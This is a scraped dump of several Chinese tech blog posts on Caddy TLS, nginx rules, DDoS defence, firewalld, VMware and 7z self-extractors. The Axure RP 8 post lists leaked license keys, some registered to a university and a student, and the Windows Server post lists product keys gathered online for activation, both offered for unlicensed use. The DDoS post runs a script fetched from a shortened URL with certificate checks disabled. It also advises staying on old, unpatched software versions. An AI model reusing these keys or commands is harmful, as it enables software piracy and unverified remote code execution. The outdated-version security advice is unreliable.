一般Caddy会自动通过acme申请证书，可突然就提示没授权，也不知道具体问题在哪。因为某些网站可以正常申请，某些却不行，可能跟服务器IP有关，也有可能跟网站解析有关。 解决办法 更换域名 因为申请失败的原因各异，如果出现自动签发证书失败，考虑下域名解析是不是错了，是不是被和谐掉了，先换个域名试下是不是就成功了？如果成功，那后面的事情就不用做了，能解决谁还想多折腾不是？ 使用手动申请证书 自己手动从证书发行方申请证书，然后在Caddy配置中指定证书和秘钥文件路径： 1tls /path/example.com.crt /path/example.com.key cert：证书文件。如果证书是由CA签署的，那么这个证书文件应该是一个包：服务器证书后面跟着CA证书(根证书通常不是必须的)。 key：与证书文件匹配的服务器私钥文件。 指定您自己的证书和密钥将禁用自动HTTPS，包括更改端口和将HTTP重定向到HTTPS。如果你正在管理自己的证书，那这些需要你自己去做。 使用自签名 1tls self_signed 上面的语法将使用Caddy的默认TLS设置，Caddy生成并在内存中使用一个不可信的自签名证书，该证书持续7天，所以它一般仅用于本地开发。 关闭TLS 由于申请CA证书失败，Caddy就直接退出了，如果对TLS没要求，可以关闭TLS，通过以下语法配置： 1tls off 禁用网站的TLS。除非你有充分的理由，否则不要推荐。关闭TLS后，自动HTTPS会被禁用，且启用默认端口(2015)，所以需要指定端口启动Caddy： 1/usr/local/bin/caddy -log stdout -agree=true -conf=/etc/caddy/Caddyfile -root=/var/tmp -port=80 参考文档 https://github.com/caddyserver/caddy/wiki/v2:-Caddyfile-examples https://dengxiaolong.com/caddy/zh/tls.html","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"Axure rp 8 可用授权码收集","slug":"axure-rp-8-sn-list","date":"2019-08-29T13:09:26.000Z","updated":"2019-08-29T13:09:26.000Z","comments":true,"path":"axure-rp-8-sn-list.html","permalink":"https://sobaigu.com/axure-rp-8-sn-list.html","excerpt":"","text":"前言 Axure对于产品经理来说，是个好工具，有能力的还是建议购买正版授权。但对于偶尔用的人来说，买个授权也只是满足临时使用，代价有点大，以下授权码可临时应急。还是那句话：有能力的请掏钱。 几乎所有的授权都是向下版本兼容，比如8.1能用的key，到8.0上也是可以用的，但到8.2版本上就不一定了，具体的自己试。 8.1.0.3377 授权用户：zdfans.com 授权秘钥：gP5uuK2gH + iIVO3YFZwoKyxAdHpXRGNnZWN8Obntqv7 ++ FF3pAz7dTu8B61ySxli 8.1.0.3372 授权用户：Koshy 授权秘钥：wTADPqxn3KChzJxLmUr5jTTitCgsfRkftQQ1yIG9HmK83MYSm7GPxLREGn + Ii6xY 8.1.0.3355 授权用户：中国科学技术大学（CLASSROOM） 授权秘钥：DTXRAnPn1P65Rt0xB4eTQ + 4bF5IUF0gu0X9XBEUhM4QxY0DRFJxYEmgh4nyh7RtL 8.0.0.3321 授权用户：米业成（STUDENT） 授权秘钥：nFmqBBvEqdvbiUjy8NZiyWiRSg3yO + PtZ8c9wdwxWse4WprphvSu9sohAdpNnJK5 8.1.0.3381 授权用户：zdfans 授权秘钥：fZw2VoYzXakllUuLVdTH13QYWnjD6NZrxgubQkaRyxD5+HNMqdr+WZKkaa6IoE5N 授权用户：zd423 授权秘钥：LrZoHQetrL7OK8XOVWgvTFn+XOR32hQkrxkYj0CkbDUsvvENp6GCS38B8GiOS1ec","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"}]},{"title":"Windows10（1903版）环境下vmware虚拟机卡死无反应问题","slug":"windows-10-1903-vmware-copy-file-issue","date":"2019-08-02T11:08:32.000Z","updated":"2019-08-02T11:08:32.000Z","comments":true,"path":"windows-10-1903-vmware-copy-file-issue.html","permalink":"https://sobaigu.com/windows-10-1903-vmware-copy-file-issue.html","excerpt":"","text":"前言 由于工作需要，需要找个测试机测试些程序。刚好公司的测试机网络有问题，只能在自己的笔记本上开虚拟机，谁知折腾了大半天！！ 现象 虚拟机以前一直用着的，Windows，Linux，macOS环境都有，但也有一阵子没开过了，没想到今日开起来各种问题： 开机进系统桌面卡住 首先，出现了Windows7虚拟机进去就卡住不动的问题，以为是镜像有问题，各镜像之间换来换去还是一样，最后把vmware卸了装装了卸，以为可能是虚拟机文件不损坏，那干脆重装吧。 宿主机间复制文件卡住无进度 重装完，确实是可以进系统了，也能操作几下，于是兴冲冲各种搭环境，设置软件。谁料复制个文件进度条不动，虚拟机也无法关闭等操作，显示 Windows 7正忙，此时也只能重启宿主机来处理。 来回折腾几次后，发现Linux虚拟机没这个问题，有几下往Windows虚拟机里拖文件也能顺利传送，但也偶尔出现拖进去也卡住。。。 解决办法 其实一开始怀疑是vmware软件有问题，毕竟用的是精简绿化版本，所以卸了装好几次，找了个14.0的版本安装版也装过了，问题是同样的。最后点了把检查更新，发现有最新的版本15.10，介绍说针对Windows10用户免费升级。 最后，安装15.10版本，问题解决，文件随便复制，随便拖拽都无此问题，最新版本vmware官方安装包可到此下载。 原因 在Windows客服帮助社区，找到篇2019年4月的求助信息，官方给的答案是咨询软件厂商。可明明以前用的好好的，最近Windows系统也有系统更新，所以完全推脱到vmware方也是不负责任的，微软的系统更新导致vmware功能异常，他们都脱不了干系！","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"Linux环境下用7z打包自解压exe文件","slug":"creat-exe-in-linux-shell","date":"2019-07-27T06:45:29.000Z","updated":"2019-07-27T06:45:29.000Z","comments":true,"path":"creat-exe-in-linux-shell.html","permalink":"https://sobaigu.com/creat-exe-in-linux-shell.html","excerpt":"","text":"适用场景 服务器为Linux环境，需要动态打包Windows下的exe程序和其配置，并能在Windows环境正常执行。 准备物料 p7zip：Linux版7zip 7zSD.sfx：7z官方的SDK里的自解压模块 7zsfx.conf：自解压配置文件，指定执行程序或命令，参数 程序文件及其配置：需要打包的业务执行程序机器附属配置 打包步骤 程序文件打包：需要打包的文件和配置准备就位并压缩为 .7z 包 生成自解压配置 7zsfx.conf：指定执行程序，执行参数，如： 1234567;!@Install@!UTF-8! //配置开始Title=&quot;Demo exe&quot;ExecuteFile=&quot;Notepad2.exe&quot; //执行文件ExecuteParameters=&quot;keys_command&quot; //可选执行参数;!@InstallEnd@! //配置结束 打包：将以上物料打包合成，执行如下命令： 1cat 7zSD.sfx 7zsfx.conf test.7z &gt;test.7z.exe 该命令执行完成后将得到一个自解压exe 参考文档 Linux下打开rar/zip/7z自解压格式文件的技巧 7z制作自解压安装包 使用7-zip制作自解压安装包 7-ZIP：不支持的方式。的原因及解决方法 7zsfx Parameters","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"利用Nginx规则实现特定渠道使用特定首页","slug":"nginx-redirect-to-special-homepage","date":"2019-07-15T10:35:17.000Z","updated":"2019-07-15T10:35:17.000Z","comments":true,"path":"nginx-redirect-to-special-homepage.html","permalink":"https://sobaigu.com/nginx-redirect-to-special-homepage.html","excerpt":"","text":"前言 维护了一个网站，发展了一批代理商推广，对用PID方法来区分来源又防止吃大锅饭的方法一直没得时间研究，所以之前一直是通过暗鹾鹾的开个子站的简单方法。随着子站越来越多，维护难度加大，也不利于品牌统一建立，针对质量可控的渠道，还是有必要使用PID方式维护。 需求场景 业务网站如：sobaigu.com ，A代理商渠道 pid=a ，B代理商渠道 pid=b ，以此类推，他们的推广地址为：http://sobaigu.com/?pid=a 这种形式。 在这些渠道商中，某些渠道质量稳定，某些可能会存着作弊等，总之是想针对特定对象，能够进行单独的页面跟踪监控。 所以比如想跟踪代理商C的质量情况，那么：当遇到 pid=c 时，打开一个特定的 index-c.html ，其他则使用默认首页 index.html 。 实现方式 在nginx中添加如下配置： 123if ($args ~* pid=c(&amp;|$)) &#123; rewrite /index.html /index-c.html last;&#125; 以上代理，实现当遇到带 pid=c 参数请求时，将 index-c.html 中内容返回，其他更多条件可根据实际情况编写对应正则表达语法。如果套了cdn的话，那么需要将参数过滤功能关闭，否则将无效或者获取到的首页相互覆盖。 参考链接 Nginx Location语法与简单配置 nginx配置location总结及rewrite规则写法 nginx配置url重写","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"Nginx反向代理配置规则","slug":"nginx-proxy-pass-rule","date":"2019-06-20T08:01:34.000Z","updated":"2019-06-20T08:01:34.000Z","comments":true,"path":"nginx-proxy-pass-rule.html","permalink":"https://sobaigu.com/nginx-proxy-pass-rule.html","excerpt":"有些时候一些应用需要做反向代理，用caddy相对来说简单点，但一般服务器上做站还是会用nginx，所以还是整理下nginx的反向代理配置，以备不时之需。","text":"有些时候一些应用需要做反向代理，用caddy相对来说简单点，但一般服务器上做站还是会用nginx，所以还是整理下nginx的反向代理配置，以备不时之需。 123456789101112location /game &#123; //此处分流路径，需与后端应用配置的路径一致 proxy_redirect off; proxy_pass http://127.0.0.1:10086; //10086为后端程序监听的端口 proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_set_header Host $http_host; # Show realip in access.log proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;&#125; 以上配置加到网站 server 配置中，当访问带 /game 路径时，会被拦截代理到本地 10086 端口。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"面对CC、DDOS攻击的常规应对方法","slug":"solution-cc-dd-acttack","date":"2019-06-08T07:14:12.000Z","updated":"2019-06-08T07:14:12.000Z","comments":true,"path":"solution-cc-dd-acttack.html","permalink":"https://sobaigu.com/solution-cc-dd-acttack.html","excerpt":"现在流行分布式攻击，查看访问日志，大批的美国IP、日本IP、以及其它国家的IP，好了，言归正传，来说下现在最流行的CC和DDOS攻击如何防御吧。 大部分的服务器、云主机、VPS主机、虚拟主机都不防DDOS的，国内的阿里云、腾讯云等主机商免费提供5G带宽峰值，但这点根本不够黑客打的，一打就黑洞，SSH根本连不上。 其实说白了，CC就是堆软件，DD就是堆硬件，堆的越多，防御越强，跟防御阵地一样。","text":"现在流行分布式攻击，查看访问日志，大批的美国IP、日本IP、以及其它国家的IP，好了，言归正传，来说下现在最流行的CC和DDOS攻击如何防御吧。 大部分的服务器、云主机、VPS主机、虚拟主机都不防DDOS的，国内的阿里云、腾讯云等主机商免费提供5G带宽峰值，但这点根本不够黑客打的，一打就黑洞，SSH根本连不上。 其实说白了，CC就是堆软件，DD就是堆硬件，堆的越多，防御越强，跟防御阵地一样。 使用CDN CDN缓存节点，非常好，凡是被DDOS的，一定是被暴露的自己的真实IP，所以必须使用CDN来隐藏，国内选择百度云加速、国外选择cloudflare，再查IP，显示的都是节点IP。然而免费的CDN虽然隐藏了IP，但只能防御几G的量，一旦超出，CDN商便会停止节点解析，直接解析到真实的主机IP上。 cloudflare：美国著名CDN商，黑客的噩梦，见到是CF的节点，黑客都懒得去打，CF防御CC攻击的效果差，高级版可以防御DDOS，价格200刀/月，请查看设置教程。 付费的CDN最能抗，然而费用非常高，付费CDN做的最好的是国内和国外的cloudflare，然而价格都不便宜，每个月一两千。你没看错，防御DDOS就是烧钱的节奏，所以很多站直接被打死，就是因为烧不起。 使用高防主机 找主机最苦逼了，很多号称高防主机，其实根本就防不住，因为机房的带宽就那些，被DDOS严重了，机房都是封IP，像国内的主机，基本300G峰值是个槛了，如果攻击你的流量大于这个值，你就必须上CDN了。 法国OVH以抗DDOS闻名世界，两个机房加拿大和法国免费提供480G的DDOS，黑客看到是法国OVH的机房，都没信心去打了。官方不支持国人购买，所以需要在二级代理商轻云LightCloud那买才行，OVH到中国的线路不好，所以访问延迟和速度差的很。 安装防火墙 虽然主机都带有防火墙，但自带的非常的鸡肋，基本可以忽视，国内比较有名的防火墙没有几个。 金盾：金盾在国内是老资格了，很多服务器安装的都是金盾，防御DDOS效果不错，国内各大高防机房的软件，安装的都是金盾，防CC、DD都不错。 拒绝访问 我从不用windows的主机，感觉漏洞太多，一直用Linux主机，nginx设置比较方便些。 拒绝非中文用户访问：这需要修改 /usr/local/nginx/conf/duimin.com.conf，正常的非中文访问的全部404错误页面。 123if ( $http_accept_language ~* ^[^zh])&#123; return 404; #非中文用户访问网站返回404&#125; 安装CCKiller：轻量级CC攻击防御脚本，由张戈编写，登录ssh，运行以下代码，然后输入y回车，回车，安装完成。每20秒检查一次，单个IP并发超过100，将会拉黑10分钟。 1wget -O CCKiller.sh --no-check-certificate https://git.io/fjzPJ &amp;&amp; bash CCKiller.sh -i 只允许中国访问：大部分的CC攻击都是来自国外，我网站都中国客户，封国外IP的话，用IP段太苦逼，直接用cloudflare的墙功能，我添加了254个国家，让他们访问都需要验证码。 禁止访问动态页面：动态就会读数据库，查询过多就会满CPU，网站就会挂，所以必须全站静态化，比如wordpress的静态化： WP Super Cache：缓存插件，一键缓存全站静态化，随便它CC。 install.php：动态，直接删除了它，/wp-admin/install.php，只有安装才会用它。 wp-login.php：必要时修改wordpress后台登录地址，跳转到首页。 /?s=：自带的查询功能真的很坑，多个IP同时刷新一个查询页面，瞬间死战，直接关闭搜索功能。 多主机IP、多主机节点 如果是DDOS攻击，主机分配的IP多的话，可以解析得到多个地址。也可以购置多个主机，分别解析绑定主机，一个IP或一个主机被攻击，其它IP或主机可以分担攻击流量。 服务器系统和网站系统 这个是最后一点了，网站安全的首要任务就是网站无漏洞让黑客钻进，所以必须把安全做到极致。 版本：系统或插件每个版本出来都会有漏洞，所以尽量使用老版本，稳定版本，不要使用过度版本。比如CentOS现在更新的7.X了，但我还是在用6.8，wordpress到4.7了，但我还是用3.X。对于插件，能用代码的绝不用插件。 因为大多数新版本都有大量的漏洞，尽量用大版本，别用小版本，wordpress好几次小更新，存在大的漏洞，就会被黑客利用。 端口：关闭ping功能和端口，或者修改端口登录，或生成秘钥登录。保护端口的软件很多，比如宝塔面板，或者云锁都有保护作用。 原文：http://duimin.com/52.html","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"},{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"windows server 2012 完全激活的方法","slug":"windows-server-2012-active-key","date":"2019-05-12T09:25:02.000Z","updated":"2019-05-12T09:25:02.000Z","comments":true,"path":"windows-server-2012-active-key.html","permalink":"https://sobaigu.com/windows-server-2012-active-key.html","excerpt":"可能时不时需要装个系统，虚拟机里随便玩玩，也就没有正版系统这回事了。可以用别人做好的工具，也可以直接用系统命令激活，以下方法收录备用。","text":"可能时不时需要装个系统，虚拟机里随便玩玩，也就没有正版系统这回事了。可以用别人做好的工具，也可以直接用系统命令激活，以下方法收录备用。 方法步骤 1、建议从微软官网下载评估版安装系统，不考虑安全问题不想从官网下载其他任何地方下载其实都可以的。 2、开始》运行》CMD(最好以管理员身份运行)》输入 DISM /online /Get-CurrentEdition （可直接复制粘贴，然后回车），看你的当前版本是什么。 如果是评估版，例如 Standard，把 ServerStandardEval 中的 Eval 这四个字母去掉，就是你的当前版本。如下所示，则当前版本就是 ServerStandard。 123456Deployment Image Servicing and Management toolVersion: 6.2.9200.16384Image Version: 6.2.9200.16384Current edition is:Current Edition : ServerStandardThe operation completed successfully. 3、然后输入并运行以下命令： 1DISM /online /Set-Edition:EDITION ID /ProductKey:X-X-X-X-X /AcceptEula 这里 ServerStandard 就是查出来的EDITION ID，将实际查出来的 Current Edition 如实填入上方命令对应位置，ProductKey 后面的序列号见附录。 4、重启 附录：网络上的key 系统版本 key Windows Server 2012 Core BN3D2-R7TKB-3YPBD-8DRP2-27GG4 Windows Server 2012 Core N 8N2M2-HWPGY-7PGT9-HGDD8-GVGGY Windows Server 2012 Core Single Language 2WN2H-YGCQR-KFX6K-CD6TF-84YXQ Windows Server 2012 Core Country Specific 4K36P-JN4VD-GDC6V-KDT89-DYFKP Windows Server 2012 Server Standard XC9B7-NBPP2-83J2H-RHMBY-92BT4 Windows Server 2012 Standard Core XC9B7-NBPP2-83J2H-RHMBY-92BT4 Windows Server 2012 MultiPoint Standard HM7DN-YVMH3-46JC3-XYTG7-CYQJJ Windows Server 2012 MultiPoint Premium XNH6W-2V9GX-RGJ4K-Y8X6F-QGJ2G Windows Server 2012 Datacenter 48HP8-DN98B-MYWDG-T2DCC-8W83P Windows Server 2012 Datacenter Core 48HP8-DN98B-MYWDG-T2DCC-8W83P Windows 7 Professional FJ82H-XT6CR-J8D7P-XQJJ2-GPDD4 Windows 7 Professional N MRPKT-YTG23-K7D7T-X2JMM-QY7MG Windows 7 Professional E W82YF-2Q76Y-63HXB-FGJG9-GF7QX Windows 7 Enterprise 33PXH-7Y6KF-2VJC9-XBBR8-HVTHH Windows 7 Enterprise N YDRBP-3D83W-TY26F-D46B2-XCKRJ Windows 7 Enterprise E C29WB-22CC8-VJ326-GHFJW-H9DH4 Windows Server 2008 R2 Web 6TPJF-RBVHG-WBW2R-86QPH-6RTM4 Windows Server 2008 R2 HPC edition TT8MH-CG224-D3D7Q-498W2-9QCTX Windows Server 2008 R2 Standard YC6KT-GKW9T-YTKYR-T4X34-R7VHC Windows Server 2008 R2 Enterprise 489J6-VHDMP-X63PK-3K798-CPX3Y Windows Server 2008 R2 Datacenter 74YFP-3QFB3-KQT8W-PMXWJ-7M648 Windows Server 2008 R2 for Itanium-based Systems GT63C-RJFQ3-4GMB6-BRFB9-CB83V Windows Web Server 2008 WYR28-R7TFJ-3X2YQ-YCY4H-M249D Windows Server 2008 Standard TM24T-X9RMF-VWXK6-X8JC9-BFGM2 Windows Server 2008 Standard without Hyper-V W7VD6-7JFBR-RX26B-YKQ3Y-6FFFJ Windows Server 2008 Enterprise YQGMW-MPWTJ-34KDK-48M3W-X4Q6V Windows Server 2008 Enterprise without Hyper-V 39BXF-X8Q23-P2WWT-38T2F-G3FPG Windows Server 2008 HPC RCTX3-KWVHP-BR6TB-RB6DM-6X7HP Windows Server 2008 Datacenter 7M67G-PC374-GR742-YH8V4-TCBY3 Windows Server 2008 Datacenter without Hyper-V 22XQ2-VRXRG-P8D42-K34TD-G3QQC Windows Server 2008 for Itanium-Based Systems 4DWFP-JF3DJ-B7DTH-78FJB-PDRHK Windows 8 Professional NG4HW-VH26C-733KW-K6F98-J8CK4 Windows 8 Professional NXCVCF-2NXM9-723PB-MHCB7-2RYQQ Windows 8 Enterprise 32JNW-9KQ84-P47T8-D8GGY-CWCK7 Windows 8 Enterprise N JMNMF-RHW7P-DMY6X-RF3DR-X2BQT Windows Vista Business YFKBB-PQJJV-G996G-VWGXY-2V3X8 Windows Vista Business N HMBQG-8H2RH-C77VX-27R82-VMQBT Windows Vista Enterprise VKK3X-68KWM-X2YGT-QR4M6-4BWMV Windows Vista Enterprise N VTC42-BM838-43QHV-84HX6-XJXKV","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"CentOS7/Ubuntu下的firewalld规则学习","slug":"get-firewalld-rules","date":"2019-03-20T09:00:32.000Z","updated":"2019-03-20T09:00:32.000Z","comments":true,"path":"get-firewalld-rules.html","permalink":"https://sobaigu.com/get-firewalld-rules.html","excerpt":"","text":"基本说明 CentOS7或Ubuntu16之后，默认都是新用的 firewalld 防火墙软件，跟 iptables 差不多的工具，用法熟悉后更简单易读可理解。 firewall-cmd 是 firewalld 的字符界面管理工具，firewalld 是centos7的一大特性，最大的好处有两个： 支持动态更新，不用重启服务；第二个就是 加入了防火墙的 zone 概念 firewalld 跟iptables 比起来至少有两大好处： firewalld 可以动态修改单条规则，而不需要像iptables 那样，在修改了规则后必须得全部刷新才可以生效 firewalld 在使用上要比 iptables 人性化很多，即使不明白“五张表五条链”而且对TCP/IP协议也不理解也可以实现大部分功能 firewalld 自身并不具备防火墙的功能，而是和 iptables 一样需要通过内核的 netfilter 来实现，也就是说 firewalld 和 iptables 一样，他们的作用都是用于维护规则，而真正使用规则干活的是内核的 netfilter ，只不过 firewalld 和 iptables 的结构以及使用方法不一样罢了。 如果系统未安装，自行安装即可：yum install firewalld firewall-config 基础用法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061firewall-cmd --version # 查看版本firewall-cmd --help # 查看帮助# 查看设置：firewall-cmd --state # 显示状态firewall-cmd --get-active-zones # 查看区域信息firewall-cmd --get-zone-of-interface=eth0 # 查看指定接口所属区域firewall-cmd --panic-on # 拒绝所有包firewall-cmd --panic-off # 取消拒绝状态firewall-cmd --query-panic # 查看是否拒绝firewall-cmd --reload # 更新防火墙规则firewall-cmd --complete-reload# 两者的区别就是第一个无需断开连接，就是firewalld特性之一动态添加规则，第二个需要断开连接，类似重启服务# 将接口添加到区域，默认接口都在publicfirewall-cmd --zone=public --add-interface=eth0# 永久生效再加上 --permanent 然后reload防火墙# 设置默认接口区域，立即生效无需重启firewall-cmd --set-default-zone=public# 查看所有打开的端口：firewall-cmd --zone=dmz --list-ports# 加入一个端口到区域：firewall-cmd --zone=dmz --add-port=8080/tcp# 若要永久生效方法同上# 打开一个服务，类似于将端口可视化，服务需要在配置文件中添加，/etc/firewalld 目录下有services文件夹，这个不详细说了，详情参考文档firewall-cmd --zone=work --add-service=smtp# 移除服务firewall-cmd --zone=work --remove-service=smtp# 显示支持的区域列表firewall-cmd --get-zones# 设置为家庭区域firewall-cmd --set-default-zone=home# 查看当前区域firewall-cmd --get-active-zones# 设置当前区域的接口firewall-cmd --get-zone-of-interface=enp03s# 显示所有公共区域（public）firewall-cmd --zone=public --list-all# 临时修改网络接口（enp0s3）为内部区域（internal）firewall-cmd --zone=internal --change-interface=enp03s# 永久修改网络接口enp03s为内部区域（internal）firewall-cmd --permanent --zone=internal --change-interface=enp03s# 显示服务列表 Amanda, FTP, Samba和TFTP等最重要的服务已经被FirewallD提供相应的服务，可以使用如下命令查看：firewall-cmd --get-services 端口服务管理 1234567891011121314151617181920# 打开443/TCP端口firewall-cmd --add-port=443/tcp# 永久打开3690/TCP端口firewall-cmd --permanent --add-port=3690/tcp# 永久打开端口好像需要reload一下，临时打开好像不用，如果用了reload临时打开的端口就失效了# 其它服务也可能是这样的，这个没有测试firewall-cmd --reload# 查看防火墙，添加的端口也可以看到firewall-cmd --list-allfirewall-cmd --add-service=mysql # 开放mysql端口firewall-cmd --remove-service=http # 阻止http端口firewall-cmd --list-services # 查看开放的服务firewall-cmd --add-port=3306/tcp # 开放通过tcp访问3306firewall-cmd --remove-port=80tcp # 阻止通过tcp访问3306firewall-cmd --add-port=233/udp # 开放通过udp访问233firewall-cmd --list-ports # 查看开放的端口 不太常用的 设置某个ip 访问某个服务 12firewall-cmd --permanent --zone=public --add-rich-rule=&quot;rule family=&quot;ipv4&quot; source address=&quot;192.168.0.4/24&quot; service name=&quot;http&quot; accept&quot;#ip 192.168.0.4/24 访问 http 删除上面设置的规则 1firewall-cmd --permanent --zone=public --remove-rich-rule=&quot;rule family=&quot;ipv4&quot; source address=&quot;192.168.0.4/24&quot; service name=&quot;http&quot; accept&quot; 查询服务的启动状态 12345678firewall-cmd --query-service ftpyesfirewall-cmd --query-service sshyesfirewall-cmd --query-service sambanofirewall-cmd --query-service httpno 屏蔽IP/IP段 刚好有个实例，屏蔽某个大哥省访问： 12345678910111213141516171819firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;49.112.0.0/13&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;218.84.0.0/14&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;110.152.0.0/14&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;120.68.0.0/14&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;222.80.0.0/15&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;124.118.0.0/15&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;110.156.0.0/15&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;124.88.0.0/16&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;124.117.0.0/16&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;222.82.0.0/16&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;60.13.128.0/16&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;202.107.128.0/17&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;222.83.0.0/17&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;221.7.0.0/19&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;202.100.176.0/20&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;202.100.168.0/21&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;202.100.160.0/21&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;103.3.136.0/22&#x27; reject&quot;firewall-cmd --permanent --add-rich-rule=&quot;rule family=&#x27;ipv4&#x27; source address=&#x27;103.22.116.0/22&#x27; reject&quot; 可能你需要以下辅助： 子网掩码计算器 查IP地址段工具 端口转发 端口转发可以将指定地址访问指定的端口时，将流量转发至指定地址的指定端口。转发的目的如果不指定 ip 的话就默认为本机，如果指定了 ip 却没指定端口，则默认使用来源端口。 如果配置好端口转发之后不能用，可以检查下面两个问题： 比如我将 80 端口转发至 8080 端口，首先检查本地的 80 端口和目标的 8080 端口是否开放监听了 其次检查是否允许伪装IP，没允许的话要开启伪装IP 123firewall-cmd --add-forward-port=port=80:proto=tcp:toport=8080 # 将80端口的流量转发至8080firewall-cmd --add-forward-port=port=80:proto=tcp:toaddr=192.168.0.1 # 将80端口的流量转发至192.168.0.1firewall-cmd --add-forward-port=port=80:proto=tcp:toaddr=192.168.0.1:toport=8080 # 将80端口的流量转发至192.168.0.1的8080端口 当我们想把某个端口隐藏起来的时候，就可以在防火墙上阻止那个端口访问，然后再开一个不规则的端口，之后配置防火墙的端口转发，将流量转发过去。 端口转发还可以做流量分发，一个防火墙拖着好多台运行着不同服务的机器，然后用防火墙将不同端口的流量转发至不同机器。 参考链接 firewall-cmd RHEL7、CentOS7 下使用 Firewall 封IP","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"BAT域名价格对比","slug":"domain-price-in-bat","date":"2019-03-19T13:24:30.000Z","updated":"2019-03-19T13:24:30.000Z","comments":true,"path":"domain-price-in-bat.html","permalink":"https://sobaigu.com/domain-price-in-bat.html","excerpt":"","text":"前言 以前解放区万网，新网这些黑心托管商太贵，逼迫良民在godaddy，namecheap，name等国外买域名，真金白银也送给了洋人。 现在，国外那些也涨价了，而且墙内这些黑心商家被BAT收编后还比较合理，虽然要实名，但一些正规的业务还是建议在这些家注册购买。 对比明细 一些垃圾域名就懒得比了，挑几个罗列下，孰优孰劣自己斟酌。 域名新注册价续费价转入价百度阿里腾讯百度阿里腾讯百度阿里腾讯.com525555556960554945.cn282930353935352925.net756953756968756968.vip3820-4030--29- 官方所有价格明细 百度 阿里 